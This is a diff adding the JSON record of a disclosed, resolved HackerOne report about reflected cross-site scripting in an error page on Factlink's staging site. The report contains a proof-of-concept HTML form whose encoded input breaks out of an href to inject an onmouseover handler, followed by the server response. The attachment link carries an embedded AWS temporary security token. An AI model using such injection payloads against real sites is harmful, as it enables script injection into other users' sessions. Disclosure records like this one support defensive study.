@@ -1,0 +1,113 @@
+{
+  "id": 18805,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xODgwNQ==",
+  "url": "https://hackerone.com/reports/18805",
+  "title": "XSS 01 on staging.fct.li",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2014-07-02T18:38:59.656Z",
+  "submitted_at": "2014-07-02T18:38:59.656Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "pum",
+    "url": "/pum",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/007/283/1b173be2ad7b39fe302f8c49f403219c3bb1bd99_original.PNG/65551465b0d18d952f306b2d0c5e69ed082a8c9bc5c9b7bec024e5edc01c00a5"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 3,
+    "url": "https://hackerone.com/factlink",
+    "handle": "factlink",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/003/319a03f582c31852bc62d152493fe213ef3aaad3_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/003/319a03f582c31852bc62d152493fe213ef3aaad3_original.jpg/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Factlink",
+      "twitter_handle": "factlink",
+      "website": "https://factlink.com",
+      "about": "Share your knowledge with the world."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2014-07-07T17:36:31.692Z",
+  "bug_reporter_agreed_on_going_public_at": "2014-07-07T17:36:31.489Z",
+  "team_member_agreed_on_going_public_at": "2014-07-07T10:38:49.059Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "hey\r\n\r\nthe error message generated can be used to escape out of a dynamically generated href link. The below will render in internet explorer (without xss filter enabled of course). See the screenshot for an example.\r\n\r\n\r\n<html>\r\n  <body>\r\n    <form action=\"http://staging.fct.li/\" method=\"POST\">\r\n      <input type=\"hidden\" name=\"url\" value=\"unana&apos;&#32;onmouseover&#61;alert&#40;1&#41;&#32;some&#61;&apos;na&#46;google&#46;de\" />\r\n      <input type=\"submit\" value=\"Submit request\" />\r\n    </form>\r\n  </body>\r\n</html>\r\n\r\n\r\nThe response is:\r\n    HTTP/1.1 504 Gateway Time-out\r\n    Server: nginx/1.4.4\r\n    Date: Wed, 02 Jul 2014 18:13:51 GMT\r\n    Content-Length: 215\r\n    Connection: keep-alive\r\n\r\n    This page is taking unusually long to load. You can try visiting the site without Factlink: <a href='http://unana' onmouseover=alert(1) some='na.google.de/'>http://unana' onmouseover=alert(1) some='na.google.de/</a>\r\n\r\n\r\nBecause of the \"onmouseover\" event waiting for its trigger you need to move your mouse over the link ...\r\n\r\ncheers pUm",
+  "weakness": {
+    "id": 60,
+    "name": "Cross-site Scripting (XSS) - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 12527,
+      "file_name": "Bildschirmfoto_2014-07-02_um_20.26.17.PNG",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/012/527/d08d54d37d04314af79720b6e4aae0ac96e8d083/Bildschirmfoto_2014-07-02_um_20.26.17.PNG?response-content-disposition=attachment%3B%20filename%3D%22Bildschirmfoto_2014-07-02_um_20.26.17.PNG%22%3B%20filename%2A%3DUTF-8%27%27Bildschirmfoto_2014-07-02_um_20.26.17.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQMPUPRRW%2F20250922%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250922T162124Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDUAMe96huAMJA5Ku%2BkKk2x0BGKeANw%2BehT0FpdSqew3wIgbYRgR7JyrTskEOx889dNsIteX16dVDG12edU%2B2SoBBEqsgUIMBADGgwwMTM2MTkyNzQ4NDkiDHjOfjDrRUX6agkr5iqPBaWVJm6mkCpcJw9t02ABC6BztF5wrYlJ%2F4Z1b4TbuNN3Wy0DtMvsJ4JhiFKYNMpzkCUHTVe8%2F106uZXaTJ1kCorUptbbDxI4I4XXx824Izg%2BHzfgtxP5%2FYqvUj4FIOcGPgjjGTrOHEUsDLQy9UoAgvuamCxhxwqKFc56XImyvBo%2B3HSipmcVJKQFpbj9Py%2FDl26H0wUrwtKsKUtZJoICTqdxxz0j9X8NhwUpf%2F0%2BV8dzs3r%2FKyid7FpwotgC8k31cPETf9JnUleOK6g3a%2BAXzf04VpqiGl%2FHhxAE%2BSUu8N3eMEkWn74K2l9azGc7YAMKG%2FOQd4nBx%2F8Z%2F%2Fkv2bnp9zs%2F9KM1keSdPp6vz58eVUTJ9DGDMexhuCsWscXVIm2eB%2F8zV65bhm9Yyed5zHAoC48yFiN%2FH%2B7S3W14YWpFyzSX5lLqAzNkyz1Zx3L%2B0oh%2B3vyvF5yZbCfo7A1NtsPTXA9Qf98TlXtD4AruTPUNlE5aP%2Bi1tlNq3OG3%2FmuCrJPSpxLtxqCigDzFgdBRzexs1B36pG4s9ht9L0gutB%2F%2BXvQK%2FL3%2BIvpfj9yXLJSd9UHca8HRFdaOQTKXNXm4fXjMTxXZGcPx7EdXnZOimvDnqE6piClDe76U0neoyNWP4OykG6%2BPFrY29bCj5S%2FiedXuTRxXjExsPjwAWFBU1o22mTyWfoQ709DTBRfc3YT%2BkpTag2K2De57UpgqcdA%2BaEQK5yYoS%2FiXItEb9j68NzfJleERRFNi4OwtDiPjHiE0LRTNVd%2B48upZK1b3Sih6WcKARPOZKLZi4TVrNIe41mGGcU6ubd207RAuNubBwaLNX1liQXX221vX8DYHbHORRfDNv5jcVNYViIsR8BLghDxjV1QwxLzFxgY6sQERHBGS0gA6o4%2Fje4i85M%2FGKFNI%2B9ddJLGKxnPflJqywXe%2BfT1vr0BGDKGzvMxGQ4CcQlcW1K8Dg2icKUmOKwI3qXos4Dya0w437Dw%2F6haBOSzssPAHCO%2FLSWbwfxjbSMf48QPYVzfFW2OdbWxaVaZADPOG1avHdjEKNZ67GCNLDAXHim3uLCyedAGGB%2FlKc5hsannKUGHYAQRtm%2BU0EBjX8f0OwsTqpvS5qydBCsb1XdI%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=fcce87505bfdd350970b2c185b2b5c13411913f5065b706eea302e2d9d142a63",
+      "file_size": 50149,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2014-08-06T10:38:49.264Z",
+  "allow_singular_disclosure_after": -351236555.5875085,
+  "singular_disclosure_allowed": true,
+  "vote_count": 3,
+  "voters": [
+    "shivammusic",
+    "quantumsage",
+    "destinedtohack"
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
